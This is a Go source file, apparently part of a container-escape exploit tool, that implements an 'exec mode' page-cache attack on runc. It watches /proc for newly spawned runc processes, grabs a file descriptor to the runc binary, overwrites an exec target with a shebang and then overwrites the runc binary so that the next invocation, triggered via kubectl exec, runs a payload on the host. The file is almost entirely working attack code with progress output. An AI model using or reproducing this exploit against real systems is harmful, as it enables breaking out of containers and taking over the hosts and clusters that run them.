//go:build linux

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// --- Process monitor: scan /proc for target process ---

// isTargetProcess reports whether pid looks like a runc process.
// It also returns the /proc/<pid>/exe path so the caller can open it directly
// without re-computing it.
func isTargetProcess(pid int) (bool, string) {
	exePath := fmt.Sprintf("/proc/%d/exe", pid)
	exe, _ := os.Readlink(exePath)
	base := filepath.Base(exe)
	if base == "runc" || base == "docker-runc" {
		return true, exePath
	}

	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	cmd := string(cmdline)
	if strings.Contains(cmd, "runc") && strings.Contains(cmd, "init") {
		return true, exePath
	}
	if cmd == "/proc/self/exe\x00init\x00" {
		return true, exePath
	}
	argv0 := strings.SplitN(cmd, "\x00", 2)[0]
	if base := filepath.Base(argv0); base == "runc" || base == "docker-runc" {
		return true, exePath
	}
	return false, ""
}

func captureTargetFD(timeout time.Duration) (int, error) {
	var deadline time.Time
	if timeout > 0 {
		deadline = time.Now().Add(timeout)
	}

	// Snapshot current max PID so we only watch newly spawned processes.
	maxPID := 0
	if entries, err := os.ReadDir("/proc"); err == nil {
		for _, e := range entries {
			if pid, err := strconv.Atoi(e.Name()); err == nil && pid > maxPID {
				maxPID = pid
			}
		}
	}

	for {
		if !deadline.IsZero() && time.Now().After(deadline) {
			return -1, fmt.Errorf("timeout waiting for target process")
		}
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return -1, err
		}
		for _, e := range entries {
			pid, err := strconv.Atoi(e.Name())
			if err != nil || pid <= maxPID {
				continue
			}
			maxPID = pid
			ok, exePath := isTargetProcess(pid)
			if !ok {
				continue
			}
			// Found target — open its exe fd with retries.
			for retry := 0; retry < 50; retry++ {
				f, err := os.Open(exePath)
				if err == nil {
					fmt.Printf("    [+] Captured: pid=%d fd=%d\n", pid, int(f.Fd()))
					return int(f.Fd()), nil
				}
				time.Sleep(time.Millisecond)
			}
		}
		time.Sleep(2 * time.Millisecond)
	}
}

// --- Exploit: exec mode ---

func exploitExec(cmd string, target string, timeout time.Duration, autoRestore bool) error {
	payload := bashPayload(payloadCommand(cmd, autoRestore))

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (exec mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	printAutoRestore(autoRestore)
	fmt.Printf("[*] Target: %s\n\n", target)

	// Step 1: overwrite target with shebang
	fmt.Println("[*] Step 1: Overwriting exec target with shebang...")
	resolved := target
	if r, err := filepath.EvalSymlinks(target); err == nil {
		resolved = r
	}
	if err := writeShebang(resolved); err != nil {
		return err
	}
	fmt.Println("[+] Step 1: Done")
	fmt.Println()

	// Step 2: wait for target process to appear, capture fd
	fmt.Println("[*] Step 2: Waiting for target process (trigger with: kubectl exec <pod> -- <cmd>)...")
	fd, err := captureTargetFD(timeout)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)

	// Step 3: overwrite runc binary via fd
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	fmt.Printf("[*] Step 3: Overwriting target binary via %s...\n", fdPath)
	if err := pageCacheWrite(fdPath, 0, payload); err != nil {
		return err
	}
	fmt.Println("[+] Done. Next invocation will execute payload on host.")
	return nil
}
